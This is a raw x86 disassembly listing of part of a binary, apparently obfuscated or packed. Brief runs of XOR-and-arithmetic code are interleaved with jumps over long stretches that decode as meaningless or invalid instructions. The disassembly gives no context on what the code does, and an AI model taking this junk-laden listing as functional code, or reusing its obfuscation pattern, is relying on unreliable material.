  402a91:	dec    ecx
  402a92:	dec    ebx
  402a93:	ror    DWORD PTR es:[edi],0x63
  402a97:	jno    0x402a7a
  402a99:	adc    BYTE PTR [ebx-0x7a],ch
  402a9c:	ror    ch,1
  402a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a9f:	lock jns 0x402a2c
  402aa2:	hlt    
  402aa3:	pop    bp
  402aa5:	(bad)  
  402aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aa7:	jmp    0x402ac7
  402aa9:	ins    BYTE PTR es:[edi],dx
  402aaa:	xor    edi,eax
  402aac:	add    edi,DWORD PTR [ebp-0x14]
  402aaf:	mov    ebx,DWORD PTR [ebp-0x1c]
  402ab2:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  402ab9:	mov    dl,BYTE PTR [ebp+0xb]
  402abc:	mov    edi,DWORD PTR [ebp-0x18]
  402abf:	xor    edi,eax
  402ac1:	add    edi,DWORD PTR [ebp-0x14]
  402ac4:	mov    ebx,DWORD PTR [ebp-0x1c]
  402ac7:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  402ace:	mov    edx,DWORD PTR [ebp-0x44]
  402ad1:	mov    edi,DWORD PTR [ebp-0xc]
  402ad4:	xor    edx,eax
  402ad6:	xor    edi,eax
  402ad8:	add    edx,ecx
  402ada:	add    edi,ecx
  402adc:	imul   edx,edi
  402adf:	add    edx,DWORD PTR [ebp-0x14]
  402ae2:	mov    DWORD PTR [ebp-0x14],edx
  402ae5:	mov    edx,DWORD PTR [ebp-0xc]
  402ae8:	mov    edi,DWORD PTR [ebp-0x24]
  402aeb:	xor    edx,eax
  402aed:	add    edx,ecx
  402aef:	jmp    0x402c0f
  402af4:	mov    dl,0x70
  402af6:	mov    bl,0x55
  402af8:	mov    ch,0x55
  402afa:	push   edx
  402afb:	adc    eax,DWORD PTR [edi-0x5470897c]
  402b01:	dec    edx
  402b02:	cli    
  402b03:	stc    
  402b04:	call   0x7c7f:0x717c7c0d
  402b0b:	jl     0x402af9
  402b0d:	jne    0x402aec
  402b0f:	push   esp
  402b10:	push   es
  402b11:	ret    0xbc9c
  402b14:	mov    edi,DWORD PTR [esi-0x7f2f7e31]
  402b1a:	call   0xe177732d
  402b1f:	rol    DWORD PTR [esp+ebx*1-0x63],1
  402b23:	stc    
  402b24:	adc    al,BYTE PTR [edx]
  402b26:	push   0x56
  402b28:	jno    0x402b1e
  402b2a:	outs   dx,DWORD PTR ds:[esi]
  402b2b:	pop    ecx
  402b2c:	loopne 0x402b3e
  402b2e:	arpl   WORD PTR [edi-0x665287ee],dx
  402b34:	fucomi st,st(0)
  402b36:	leave  
  402b37:	imul   ebp,DWORD PTR [esi-0x4916e0b],0x3c
  402b3e:	cmp    eax,0xed465337
  402b43:	sbb    eax,0x8e372954
  402b48:	mov    bh,0xb
  402b4a:	pop    ss
  402b4b:	retf   
  402b4c:	sbb    DWORD PTR [ebx+0x789f753f],eax
  402b52:	pop    ds
  402b53:	lods   eax,DWORD PTR ds:[esi]
  402b54:	sub    dh,bh
  402b56:	and    eax,0xbbbfd24a
  402b5b:	lock daa 
  402b5d:	sub    eax,0x13c28227
  402b62:	(bad)  
  402b63:	sub    eax,0x91fcc2b4
  402b68:	call   ebp
  402b6a:	je     0x402b92
  402b6c:	sub    esi,edi
  402b6e:	dec    ebp
  402b6f:	cmp    ebx,DWORD PTR [esi+0xc]
  402b72:	mov    dh,0x28
  402b74:	aas    
  402b75:	push   esp
  402b76:	in     al,0xa7
  402b78:	and    eax,DWORD PTR [ecx]
  402b7a:	adc    al,0x42
  402b7c:	leave  
  402b7d:	nop
  402b7e:	push   ss
  402b7f:	mov    ds:0x8e9067fe,eax
  402b84:	jl     0x402b09
  402b86:	and    ch,ch
  402b88:	clc    
  402b89:	mov    ebx,DWORD PTR [edx]
  402b8b:	(bad)  
  402b8c:	pop    ds
  402b8d:	int    0xe3
  402b8f:	dec    eax
  402b90:	xor    ebx,DWORD PTR [esi+0x51]
  402b93:	or     al,0xbf
  402b95:	cmp    eax,0xb
  402b98:	jmp    0xebc0:0x8c3e51a8
  402b9f:	(bad)  
  402ba1:	push   esp
  402ba2:	jmp    0x402bbd
  402ba4:	inc    edx
  402ba5:	jae    0x402b35
  402ba7:	test   eax,0x84f27c2b
  402bac:	sbb    al,0x8
  402bae:	in     eax,dx
  402baf:	pop    ecx
  402bb0:	sub    eax,0x2a0abf3d
  402bb5:	mov    eax,0x25f7ff63
  402bba:	pop    eax
  402bbb:	inc    esi
  402bbc:	mov    eax,DWORD PTR [edi-0x17]
  402bbf:	dec    ecx
  402bc0:	and    eax,0xae69921
  402bc5:	daa    
  402bc6:	call   0x681b118b
  402bcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bcc:	fisttp QWORD PTR [edx-0x7ef63c70]
  402bd2:	push   eax
  402bd3:	jecxz  0x402bac
  402bd5:	clc    
  402bd6:	or     al,0x9a
  402bd8:	call   0x640c:0x186be2de
  402bdf:	popf   
  402be0:	pop    ecx
  402be1:	nop
  402be2:	enter  0x624c,0x74
  402be6:	les    esi,FWORD PTR [edi-0x52]
  402be9:	popa   
  402bea:	xchg   ecx,eax
  402beb:	or     esi,DWORD PTR [edi-0x504fce85]
  402bf1:	adc    BYTE PTR [ecx+0x26e976e5],0x21
  402bf8:	dec    ecx
  402bf9:	xchg   BYTE PTR [eax],ch
  402bfb:	rol    DWORD PTR [ebx],0x75
  402bfe:	(bad)  
  402bff:	addr16 jp 0x402c25
  402c02:	outs   dx,BYTE PTR ds:[esi]
  402c03:	push   esi
  402c04:	push   eax
  402c05:	dec    esi
  402c06:	imul   edi,DWORD PTR [ebp+0x3abc06ba],0xfe400bb
  402c10:	scas   eax,DWORD PTR es:[edi]
  402c11:	xlat   BYTE PTR ds:[ebx]
  402c12:	mov    edi,DWORD PTR [ebp-0xc]
  402c15:	xor    edi,eax
  402c17:	sub    edx,edi
  402c19:	mov    edi,DWORD PTR [ebp-0xc]
  402c1c:	mov    ebx,DWORD PTR [ebp-0x14]
  402c1f:	xor    edi,eax
  402c21:	add    edi,ecx
  402c23:	imul   edi,ebx
  402c26:	mov    ebx,DWORD PTR [ebp-0x18]
  402c29:	xor    ebx,eax
  402c2b:	sub    edx,ecx
  402c2d:	lea    edi,[edi+ebx*1+0x32729e]
  402c34:	cmp    edi,edx
  402c36:	jbe    0x40295a
  402c3c:	mov    edx,DWORD PTR [ebp-0xc]
  402c3f:	mov    edi,DWORD PTR [ebp-0x24]
  402c42:	xor    edx,eax
  402c44:	add    edx,ecx
  402c46:	imul   edx,edi
  402c49:	mov    edi,DWORD PTR [ebp-0x18]
  402c4c:	xor    edi,eax
  402c4e:	add    edx,edi
  402c50:	mov    edi,DWORD PTR [ebp-0x8]
  402c53:	lea    edx,[edx+edi*1+0x32729e]
  402c5a:	mov    DWORD PTR [ebp-0x8],edx
  402c5d:	mov    edx,DWORD PTR [ebp-0x20]
  402c60:	xor    edx,eax
  402c62:	mov    edi,0xffcd8d62
  402c67:	sub    edi,edx
  402c69:	add    edi,DWORD PTR [ebp-0x10]
  402c6c:	mov    edx,DWORD PTR [ebp-0x20]
  402c6f:	mov    ebx,DWORD PTR [ebp-0x8]
  402c72:	xor    edx,eax
  402c74:	add    edx,ecx
  402c76:	imul   edx,ebx
  402c79:	cmp    edx,edi
  402c7b:	jbe    0x40217b
  402c81:	pop    ebx
  402c82:	pop    edi
  402c83:	leave  
  402c84:	ret    0x8
  402c87:	push   ebp
  402c88:	mov    ebp,esp
  402c8a:	jmp    0x402d8c
  402c8f:	test   al,0x6e
  402c91:	iret   
  402c92:	clc    
  402c93:	fnstsw WORD PTR [ebp-0x55]
  402c96:	outs   dx,BYTE PTR ds:[esi]
  402c97:	ret    
  402c98:	popf   
  402c99:	aam    0x5e
  402c9b:	jbe    0x402c1f
  402c9d:	sbb    ebp,edi
  402c9f:	lahf   
  402ca0:	or     al,0x7c
  402ca2:	jl     0x402cf7
  402ca4:	jl     0x402d22
  402ca6:	jl     0x402c96
  402ca8:	int3   
  402ca9:	pop    es
  402caa:	outs   dx,DWORD PTR ds:[esi]
  402cab:	rol    DWORD PTR [edx+ebx*1-0x63988949],1
  402cb2:	(bad)  
  402cb3:	jg     0x402d12
  402cb5:	aas    
  402cb6:	fsub   st(1),st
  402cb8:	push   esp
  402cb9:	enter  0x82ef,0xe
  402cbd:	and    al,0xfa
  402cbf:	jmp    0x1b9b:0xd97787b6
  402cc6:	push   edi
  402cc7:	lahf   
  402cc8:	adc    edx,DWORD PTR [edi+0x3d]
  402ccb:	pop    edi
  402ccc:	sar    DWORD PTR [eax+0x15f6ecbf],1
  402cd2:	or     DWORD PTR [ecx+ebx*1-0x5d],edi
  402cd6:	shr    BYTE PTR [edx+0x642adadb],1
  402cdc:	in     eax,dx
  402cdd:	retf   
  402cde:	inc    ebp
  402cdf:	cmp    BYTE PTR [ecx-0x39],ch
  402ce2:	and    al,0x81
  402ce4:	adc    al,0x37
  402ce6:	jmp    DWORD PTR [ebx]
  402ce8:	out    0x97,eax
  402cea:	mov    dh,0x6
  402cec:	out    0xe,eax
  402cee:	and    eax,ecx
  402cf0:	sbb    al,0xe6
  402cf2:	cmp    al,0x0
  402cf4:	or     ebx,DWORD PTR [edi-0x48176f8]
  402cfa:	jg     0x402cca
  402cfc:	cmp    bl,BYTE PTR [eax]
  402cfe:	and    al,0x5d
  402d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d01:	jg     0x402c8b
  402d03:	fdivr  st,st(6)
  402d05:	jnp    0x402d40
  402d07:	jmp    0xda4d:0xe0d2e9b1
  402d0e:	or     dh,BYTE PTR [ebx]
  402d10:	push   esi
  402d11:	ret    0x70d4
  402d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d15:	sbb    DWORD PTR ds:0xd4bf388a,edx
  402d1b:	test   al,0x3
  402d1d:	jle    0x402d35
  402d1f:	xchg   ebp,eax
  402d20:	cs xchg esi,eax
  402d22:	imul   BYTE PTR [edi-0x4a]
  402d25:	dec    esi
  402d26:	loopne 0x402cae
  402d28:	xchg   esi,eax
  402d29:	xchg   edi,eax
  402d2a:	pop    ds
  402d2b:	xchg   ebp,eax
  402d2c:	jmp    0x402d85
  402d2e:	mov    al,0x8d
  402d30:	(bad)  
  402d33:	sub    ah,cl
  402d35:	nop/reserved BYTE PTR [ecx]
  402d38:	pop    edi
  402d39:	in     al,dx
  402d3a:	jge    0x402d5c
  402d3c:	repz bnd jns 0x402d89
  402d40:	outs   dx,BYTE PTR ds:[esi]
  402d41:	jae    0x402cef
  402d43:	mov    esp,0xb6732a36
  402d48:	stc    
  402d49:	ins    BYTE PTR es:[edi],dx
  402d4a:	outs   dx,BYTE PTR ds:[esi]
  402d4b:	adc    al,0x1a
  402d4d:	dec    ecx
  402d4e:	dec    ecx
  402d4f:	mov    al,ds:0x75cfa82b
  402d54:	inc    ebx
  402d55:	cmp    DWORD PTR [eax+0x24],edi
  402d58:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  402d5a:	repz ret 
  402d5c:	stos   DWORD PTR es:[edi],eax
  402d5d:	and    edx,DWORD PTR [edi]
  402d5f:	addr16 in al,0xd4
  402d62:	clc    
  402d63:	fwait
  402d64:	jnp    0x402d49
  402d66:	jl     0x402dd4
  402d68:	xchg   edx,eax
  402d69:	outs   dx,BYTE PTR ds:[esi]
  402d6a:	jmp    0xa7bf:0xc1780689
  402d71:	not    BYTE PTR [esp+ebp*1-0x1]
  402d75:	cwde   
  402d76:	jecxz  0x402d6f
  402d78:	shr    edx,1
  402d7a:	lds    ebp,FWORD PTR [eax]
  402d7c:	rcr    esi,0x18
  402d7f:	sbb    eax,0xab98a042
  402d84:	and    BYTE PTR [eax+0x1c30e2c9],cl
  402d8a:	jmp    0x402da7
  402d8c:	push   ecx
  402d8d:	and    edx,DWORD PTR ds:0x4275a8
  402d93:	push   ecx
  402d94:	and    DWORD PTR ds:0x427d1f,edi
  402d9a:	mov    eax,0xf89c8535
  402d9f:	mov    ecx,DWORD PTR ds:0x4278ab
  402da5:	mov    ecx,DWORD PTR [ecx]
  402da7:	xor    DWORD PTR ds:0x42c89a,ecx
  402dad:	mov    DWORD PTR [ebp-0x8],eax
  402db0:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402db7:	jmp    0x402eb9
  402dbc:	aas    
  402dbd:	enter  0x7aef,0xfb
  402dc1:	jge    0x402e10
  402dc3:	jge    0x402db3
  402dc5:	int    0x4c
  402dc7:	jae    0x402d86
  402dc9:	fdivr  DWORD PTR [ebx+0x7c0ff2c4]
  402dcf:	jl     0x402e24
  402dd1:	jl     0x402e4f
  402dd3:	jl     0x402e3e
  402dd5:	push   esi
  402dd6:	add    BYTE PTR [eax],ch
  402dd8:	outs   dx,DWORD PTR ds:[esi]
  402dd9:	sub    al,0x9c
  402ddb:	pop    ebp
  402ddc:	(bad)  
  402ddd:	rcr    BYTE PTR [esi-0x61e629bd],1
  402de3:	sti    
  402de4:	imul   ecx,esp,0x14
  402de7:	sti    
  402de8:	ja     0x402dbd
  402dea:	mov    ds:0x89bb8a87,eax
  402def:	jo     0x402e37
  402df1:	add    DWORD PTR [edi+0x7b],ebx
  402df4:	push   ss
  402df5:	dec    eax
  402df6:	inc    esi
  402df7:	aaa    
  402df8:	sub    cl,BYTE PTR [edi+ebx*2+0x5294d1fd]
  402dff:	inc    esp
  402e00:	mov    cl,0x7a
  402e02:	dec    ebx
  402e03:	ins    DWORD PTR es:[edi],dx
  402e04:	(bad)  [edx-0x28]
  402e07:	cmp    DWORD PTR [ebx],ebx
  402e09:	sub    al,ch
  402e0b:	lea    ebp,[ebp+0x23fbbb85]
  402e11:	xchg   ebp,eax
  402e12:	jmp    FWORD PTR [edx+0x4f]
  402e15:	xor    eax,0xbbb9244
  402e1a:	pop    ss
  402e1b:	mov    ebx,0xf22b8da
  402e20:	clc    
  402e21:	jnp    0x402e79
  402e23:	and    edx,eax
  402e25:	xchg   ebp,eax
  402e26:	pushf  
  402e27:	hlt    
  402e28:	sbb    dh,bl
  402e2a:	and    DWORD PTR [edx-0x7e],ebp
  402e2d:	shl    DWORD PTR fs:[ecx+0x3c],0x1a
  402e32:	mov    ebx,0x4eb985a4
  402e37:	push   eax
  402e38:	xor    edi,DWORD PTR [ecx+0xcc1a192]
  402e3e:	inc    edx
  402e3f:	cdq    
  402e40:	mov    ds:0x40263b35,al
  402e45:	mov    edi,esp
  402e47:	outs   dx,BYTE PTR ds:[esi]
  402e48:	xlat   BYTE PTR ds:[ebx]
  402e49:	jecxz  0x402e84
  402e4b:	addr16 jne 0x402df1
  402e4e:	cli    
  402e4f:	daa    
  402e50:	scas   eax,DWORD PTR es:[edi]
  402e51:	xor    al,0xe2
  402e53:	jp     0x402e33
  402e55:	pop    ebx
  402e56:	enter  0x85e0,0x43
  402e5a:	adc    al,0x28
  402e5c:	pop    edx
  402e5d:	cmc    
  402e5e:	or     ch,cl
  402e60:	pop    ss
  402e61:	test   BYTE PTR [ecx+eiz*4+0x57d40423],0x41
  402e69:	pop    edi
  402e6a:	xor    DWORD PTR [edx],edi
  402e6c:	out    0xc0,al
  402e6e:	gs sub al,0xfe
  402e71:	lds    edi,FWORD PTR [esi-0x6]
  402e74:	jl     0x402e7d
  402e76:	nop
  402e77:	nop
  402e78:	int    0xd5
  402e7a:	or     ecx,esi
  402e7c:	cli    
  402e7d:	xchg   edi,eax
  402e7e:	jl     0x402efd
  402e80:	xchg   ebp,eax
  402e81:	mov    esp,DWORD PTR [esi+0x18]
  402e84:	icebp  
  402e85:	icebp  
  402e86:	jne    0x402ea8
  402e88:	arpl   bp,dx
  402e8a:	je     0x402e61
  402e8c:	cmp    DWORD PTR [ebp-0x62],ebp
  402e8f:	adc    DWORD PTR [edx-0x6737b485],0x21635093
  402e99:	push   ebp
  402e9a:	(bad)  
  402e9b:	sub    eax,0x362c2e2b
  402ea0:	ds dec esi
  402ea2:	js     0x402ed7
  402ea4:	int3   
  402ea5:	in     eax,0x67
  402ea7:	add    al,0xa8
  402ea9:	sub    BYTE PTR [ebp-0x61],ch
  402eac:	mov    ah,0xcd
  402eae:	add    eax,0x41591412
  402eb3:	mov    bh,BYTE PTR [eax]
  402eb5:	pop    ecx
  402eb6:	mov    edx,0x558b1ee2
  402ebb:	clc    
  402ebc:	neg    DWORD PTR ds:0x4275a0
  402ec2:	push   esi
  402ec3:	jmp    0x402fc5
  402ec8:	xor    BYTE PTR [eax-0x3f],cl
  402ecb:	aaa    
  402ecc:	pop    ecx
  402ecd:	pop    ebp
  402ece:	fimul  DWORD PTR [ebx+0xf]
  402ed1:	mov    eax,ds:0xa986860b
  402ed6:	stos   DWORD PTR es:[edi],eax
  402ed7:	lods   eax,DWORD PTR ds:[esi]
  402ed8:	jmp    0x53bcaaeb
  402edd:	jl     0x402f5b
  402edf:	jl     0x402eed
  402ee1:	iret   
  402ee2:	mul    edi
  402ee4:	idiv   DWORD PTR [ebp+0x21]
  402ee7:	mov    BYTE PTR [esi+ebp*8-0x19ec3d6e],0x6c
  402eef:	js     0x402e7b
  402ef1:	das    
  402ef2:	fdiv   QWORD PTR [edx+0x1b12999]
  402ef8:	push   edx
  402ef9:	sti    
  402efa:	int    0x42
  402efc:	mov    DWORD PTR [esi-0x5],ebx
  402eff:	lods   al,BYTE PTR ds:[esi]
  402f00:	and    al,0xac
  402f02:	mov    ah,0x14
  402f04:	mov    al,0x45
  402f06:	and    BYTE PTR [ebp+edi*1+0x60],dh
  402f0a:	loope  0x402f53
  402f0c:	call   0xc982cce3
  402f11:	mov    eax,0x94a8abb3
  402f16:	push   es
  402f17:	fisttp DWORD PTR [edi]
  402f19:	xchg   edi,eax
  402f1a:	and    ebx,DWORD PTR [esi-0x62125268]
  402f20:	stc    
  402f21:	pmulhw mm3,mm1
  402f24:	mov    DWORD PTR [edx+ebp*4+0x3e6a9dfc],ebp
  402f2b:	jb     0x402f97
  402f2d:	cmp    DWORD PTR [ebx-0x41fe0691],edi
  402f33:	sbb    al,0xa0
  402f35:	pop    ecx
  402f36:	lds    esp,FWORD PTR [ebx+0x49]
  402f39:	mov    ds,edi
  402f3b:	inc    ecx
  402f3c:	enter  0x11ba,0x5b
  402f40:	pop    esp
  402f41:	xor    BYTE PTR [eax+ebx*2-0x17b71044],ch
  402f48:	fsubr  DWORD PTR [ebp-0x2f]
  402f4b:	jae    0x402fc5
  402f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f4e:	xchg   ch,dl
  402f50:	jno    0x402f78
  402f52:	hlt    
  402f53:	hlt    
  402f54:	cmp    eax,0xcfb2f071
  402f59:	add    esp,DWORD PTR [eax-0xb41749a]
  402f5f:	nop
  402f60:	leave  
  402f61:	(bad)
  402f64:	add    esp,0xfff23bbc
  402f6a:	test   al,0xd0
  402f6c:	inc    edx
  402f6d:	(bad)  
  402f6e:	out    0xe0,eax
  402f70:	iret   
  402f71:	xor    BYTE PTR [ebp+eiz*2+0x36],0xd7
  402f76:	mov    ds:0x210e132c,al
  402f7b:	and    DWORD PTR [ebp-0x7f],ebx
  402f7e:	jae    0x402f54
  402f80:	jbe    0x402ffb
  402f82:	and    BYTE PTR [ecx+0x37],dl
  402f85:	inc    ebx
  402f86:	cmp    al,0x2f
  402f88:	hlt    
  402f89:	xor    eax,0xb9e282b3
  402f8e:	lock das 
  402f90:	inc    ebx
  402f91:	addr16 push ecx
  402f93:	pop    edx
  402f94:	push   es
  402f95:	sbb    esi,DWORD PTR [esi-0x3c]
  402f98:	inc    ebp
  402f99:	pop    ebp
  402f9a:	fmul   DWORD PTR [edx-0x6f225f4c]
  402fa0:	sub    BYTE PTR gs:[eax],dl
  402fa3:	sbb    DWORD PTR [edx-0x7d],edx
  402fa6:	dec    ebp
  402fa7:	mov    ah,0x9
  402fa9:	xchg   edi,eax
  402faa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fab:	inc    ebp
  402fac:	mov    ecx,0xd7899da2
  402fb1:	rcl    DWORD PTR [ebx],0x7f
  402fb4:	add    BYTE PTR [ebx+0x7e],al
  402fb7:	xor    eax,0xa8972ef5
  402fbc:	cwde   
  402fbd:	pop    ds
  402fbe:	ds inc edx
  402fc0:	adc    bh,ch
  402fc2:	loope  0x402fe3
  402fc4:	cli    
  402fc5:	mov    ecx,0x7510857
  402fca:	jmp    0x4030cc
  402fcf:	xlat   BYTE PTR ds:[ebx]
  402fd0:	push   ebp
  402fd1:	imul   ebp,DWORD PTR [eax+0x6d],0xe255ed68
  402fd8:	xor    ecx,DWORD PTR [ecx]
  402fda:	xchg   edx,eax
  402fdb:	stc    
  402fdc:	das    
  402fdd:	xor    ebp,esi
  402fdf:	int3   
  402fe0:	add    DWORD PTR [esp+edi*2+0x53],edi
  402fe4:	jl     0x403062
  402fe6:	jl     0x402fc3
  402fe8:	xchg   DWORD PTR [ebp+0x1663c229],esi
  402fee:	push   0xffffffd4
  402ff0:	jnp    0x402f77
  402ff2:	cld    
  402ff3:	adc    BYTE PTR [edx+ebx*2+0x58],ch
  402ff7:	xchg   esp,eax
  402ff8:	repnz xchg esp,eax
  402ffa:	int3   
  402ffb:	inc    esp
  402ffc:	pop    ebx
  402ffd:	add    DWORD PTR [eax+0x6e],esp
  403000:	adc    eax,0x3f89fff6
  403005:	push   eax
  403006:	sub    esp,edi
  403008:	js     0x402fb3
  40300a:	mov    cl,0x45
  40300c:	ror    BYTE PTR [edx+0x3],cl
  40300f:	xchg   edi,eax
  403010:	ds jg  0x40308c
  403013:	fsubr  QWORD PTR [edx+0x6d]
  403016:	or     DWORD PTR [edi],0xffffff8d
  403019:	lea    ebp,[esi+eiz*1+0x345be642]
  403020:	test   al,0xe9
  403022:	les    ebx,FWORD PTR ds:0xc97eda6f
  403028:	sub    eax,0x2dc9a5ca
  40302d:	mov    dh,0xd4
  40302f:	dec    eax
  403030:	push   ecx
  403031:	mov    ecx,0x375c14ca
  403036:	pop    esp
  403037:	les    esp,FWORD PTR [ecx+ebx*1+0x409154d2]
  40303e:	mov    bh,0xbc
  403040:	mov    edx,0xf70978fd
  403045:	fadd   DWORD PTR [ebx]
  403047:	jbe    0x40300d
  403049:	xchg   ebx,eax
  40304a:	jmp    0xde01:0x953a6c92
  403051:	sub    bh,0xbd
  403054:	sbb    ebx,DWORD PTR es:[eax]
  403057:	ins    BYTE PTR es:[edi],dx
  403058:	pop    ss
  403059:	pop    esi
  40305a:	not    BYTE PTR [ebx+0x6e]
  40305d:	out    dx,eax
  40305e:	pop    ds
  40305f:	mov    bh,0xa2
  403061:	jle    0x403044
  403063:	adc    ch,BYTE PTR [edi+0x63]
  403066:	mov    dh,BYTE PTR [ebp-0x22c92b5a]
  40306c:	mov    dh,0xd0
  40306e:	or     eax,0xb759e7d0
  403073:	jge    0x4030ec
  403075:	jbe    0x403009
  403077:	mov    eax,ds:0x4db5f624
  40307c:	xchg   esp,eax
  40307d:	cmp    BYTE PTR [esi+eax*8],ch
  403080:	jb     0x40300f
  403082:	jp     0x4030e8
  403084:	out    0x9e,eax
  403086:	jnp    0x40301c
  403088:	test   eax,ebp
  40308a:	es scas eax,DWORD PTR es:[edi]
  40308c:	cmp    bl,BYTE PTR [esi-0x13c865e5]
  403092:	test   BYTE PTR [edi+0x7d],cl
  403095:	adc    al,0xa9
  403097:	into   
  403098:	daa    
  403099:	inc    eax
  40309a:	cwde   
  40309b:	mov    ds:0x2e6ba838,eax
  4030a0:	mov    ds:0x39af515f,al
  4030a5:	fld    TBYTE PTR [esi+0x1b]
  4030a8:	in     al,0x3d
  4030aa:	pop    eax
  4030ab:	mov    WORD PTR [ebx+0x3c],cs
  4030ae:	cmp    al,BYTE PTR [esi+0x7a20caae]
  4030b4:	je     0x403066
  4030b6:	fisttp QWORD PTR ds:0xa3efebe4
  4030bc:	nop
  4030bd:	in     eax,dx
  4030be:	adc    al,0x66
  4030c0:	aaa    
  4030c1:	outs   dx,DWORD PTR ds:[esi]
  4030c2:	aaa    
  4030c3:	add    al,0x53
  4030c5:	test   al,0x9
  4030c7:	push   ebp
  4030c8:	mov    eax,0x33975e23
  4030cd:	ror    DWORD PTR [ebx+0x4292a535],1
  4030d3:	add    BYTE PTR [ecx],cl
  4030d5:	xor    eax,0x4275a8
  4030da:	mov    esi,0x32729e
  4030df:	push   edi
  4030e0:	mov    edi,DWORD PTR [ebp+0x10]
  4030e3:	sub    DWORD PTR ds:0x42c88e,0x427d17
  4030ed:	add    edx,esi
  4030ef:	cmp    edi,edx
  4030f1:	jmp    0x4031f3
  4030f6:	in     eax,0x90
  4030f8:	ds std 
  4030fa:	inc    ecx
  4030fb:	jge    0x4030fa
  4030fd:	test   al,0xb1
  4030ff:	test   BYTE PTR [ebx],0x86
  403102:	cmp    BYTE PTR [edx+0xa],0x5c
  403106:	and    eax,DWORD PTR [eax]
  403108:	jl     0x403186
  40310a:	push   ebx
  40310b:	jl     0x403189
  40310d:	jl     0x403127
  40310f:	add    DWORD PTR [ebx],0xffffffae
  403112:	fmul   DWORD PTR [ebx+0x6ce27db6]
  403118:	aam    0x6d
  40311a:	or     ebp,0x815c34d1
  403120:	imul   ebx,DWORD PTR [edi],0xe1f1935e
  403126:	icebp  
  403127:	bound  ebp,QWORD PTR [ebp+0x32acc0a8]
  40312d:	mov    ebp,0x52a26355
  403132:	js     0x40313b
  403134:	jg     0x40317a
  403136:	les    eax,FWORD PTR [ecx-0xc]
  403139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40313a:	ja     0x4030c9
  40313c:	mov    eax,0x685d70a
  403141:	scas   eax,DWORD PTR es:[edi]
  403142:	and    ah,BYTE PTR [ebx+0x36]
  403145:	retf   0xc5ba
  403148:	push   0xffffffd7
  40314a:	cmp    cl,bl
  40314c:	mov    cl,0xf7
  40314e:	sub    ecx,DWORD PTR [ebx-0x76]
  403151:	(bad)
  403154:	daa    
  403155:	add    BYTE PTR [edi-0x54a8eea2],al
  40315b:	inc    ebp
  40315c:	int3   
  40315d:	pop    ecx
  40315e:	pop    esi
  40315f:	cli    
  403160:	aad    0xd8
  403162:	clc    
  403163:	sub    al,al
  403165:	aad    0x5
  403167:	fwait
  403168:	jecxz  0x4030f5
  40316a:	mov    ah,0x29
  40316c:	xor    BYTE PTR [edx+0x1f],bl
  40316f:	cmp    DWORD PTR [eax+0x40],edi
  403172:	jl     0x4031e8
  403174:	aad    0xe4
  403176:	or     esi,DWORD PTR [esi+0x44a1f9c5]
  40317c:	ja     0x4031a5
  40317e:	add    eax,0x92c65d11
  403183:	lahf   
  403184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403185:	push   es
  403186:	or     esp,DWORD PTR [eax+eiz*2]
  403189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40318a:	or     BYTE PTR [ebp+eax*4+0x50],bl
  40318e:	xchg   esi,eax
  40318f:	cmp    edx,DWORD PTR [edi]
  403191:	dec    ecx
  403192:	(bad)  
  403193:	retf   0x9a6d
  403196:	pop    edx
  403197:	sub    eax,0x7fd9c19d
  40319c:	stos   DWORD PTR es:[edi],eax
  40319d:	(bad)  
  40319e:	fdivr  st,st(1)
  4031a0:	pushf  
  4031a1:	add    al,0xac
  4031a3:	adc    al,0xbd
  4031a5:	xor    edx,DWORD PTR [eax+eax*8+0x3f2cf709]
  4031ac:	ret    0x1b42
  4031af:	push   edi
  4031b0:	push   esi
  4031b1:	cmc    
  4031b2:	or     ebx,esi
  4031b4:	sub    al,0xde
  4031b7:	rol    DWORD PTR [esi-0x497fb62d],cl
  4031bd:	cmp    eax,0x5d32c1ba
  4031c2:	cmc    
  4031c3:	xor    eax,0xb2169b64
  4031c8:	fbld   TBYTE PTR [esi+ecx*2]
  4031cb:	or     al,BYTE PTR [edx+0x18]
  4031ce:	inc    ebx
  4031cf:	imul   ebp,DWORD PTR [esi],0xffffffbb
  4031d2:	sbb    BYTE PTR [ebp+0x5b467686],0xfc
  4031d9:	mov    bl,0x9a
  4031dc:	and    eax,0x19f064c1
  4031e1:	or     eax,0xfb7ebd3e
  4031e6:	xchg   BYTE PTR [edx],al
  4031e8:	int3   
  4031e9:	add    BYTE PTR [ecx-0x728c82f4],dl
  4031ef:	stos   DWORD PTR es:[edi],eax
  4031f0:	push   ds
  4031f1:	mov    dh,0x59
  4031f3:	je     0x4034f0
  4031f9:	adc    edi,DWORD PTR ds:0x4292c1
  4031ff:	mov    edx,DWORD PTR [ebp-0x8]
  403202:	mov    eax,DWORD PTR [ebp-0x4]
  403205:	xor    eax,ecx
  403207:	and    DWORD PTR ds:0x4275a0,0x0
  403211:	jmp    0x403223
  403216:	mov    edi,DWORD PTR ds:0x4275a0
  40321c:	inc    edi
  40321d:	mov    DWORD PTR ds:0x4275a0,edi
  403223:	cmp    DWORD PTR ds:0x4275a0,0x1e
  40322a:	jae    0x40326d
  403230:	cmp    DWORD PTR ds:0x4275a0,0xa
  403237:	jne    0x403248
  40323d:	push   0x444a
  403242:	call   DWORD PTR ds:0x4279cb
  403248:	cmp    DWORD PTR ds:0x4275a0,0x9
  40324f:	jne    0x403262
  403255:	mov    edi,DWORD PTR ds:0x4275a0
  40325b:	inc    edi
  40325c:	mov    DWORD PTR ds:0x4275a0,edi
  403262:	jmp    0x403216
  403267:	or     DWORD PTR ds:0x427d0b,ecx
  40326d:	mov    edi,0xffcd8d62
  403272:	sub    edi,eax
  403274:	add    edi,DWORD PTR [ebp+0x10]
  403277:	or     DWORD PTR ds:0x427d07,0x4292a9
  403281:	xor    edx,ecx
  403283:	jmp    0x403385
  403288:	mov    DWORD PTR [edx-0x34],edi
